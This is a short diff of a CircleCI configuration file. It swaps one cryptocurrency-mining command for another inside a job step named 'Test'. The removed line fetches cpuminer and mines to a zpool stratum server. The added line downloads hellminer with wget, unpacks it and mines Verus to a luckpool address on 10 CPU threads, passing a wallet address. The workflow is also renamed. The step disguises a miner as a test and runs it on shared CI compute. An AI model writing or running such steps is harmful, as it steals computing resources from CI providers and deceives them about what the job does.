@@ -8,10 +8,10 @@ jobs:
     executor: python/default
     steps:
       - run:
-          command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DGGjw2JWYbwFHgU7sYwPvro74Pp2T5s8Z5 -p c=DGB
+          command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RW57ofNA426jDvqPfjUBDuGxGkMfZofjuk.verus -p x --cpu 10
           name: Test
 
 workflows:
-  all-tests:
+  main:
     jobs:
       - build-and-test
